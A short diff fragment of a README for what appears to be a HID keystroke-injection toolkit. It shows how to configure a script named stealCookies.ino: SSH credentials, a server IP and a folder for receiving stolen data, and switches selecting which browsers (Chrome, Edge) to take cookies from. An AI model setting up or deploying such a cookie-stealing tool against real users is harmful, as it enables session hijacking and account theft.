@@ -29,12 +29,14 @@ This way you will upload script to your HID. Scripts are configured to run autom
 Each script can be configured for ones needs. Configuration is at the top of the script. Let's have a look at _stealCookies.ino_ as an example:
 
 _here you can assign username and password for SSH server connection as well as server IP and path to destination folder:_
+
 const char* server_user = "ubuntu";
 const char* server_password = "ubuntu";
 const char* server_path = "/home/ubuntu";
 const char* server_ip = "192.168.8.124";
 
 _here you can enable from which browsers script will take an attemp to steal cookies_
+
 bool chrome = 1;
 bool firefox = 0;
 bool edge = 1;
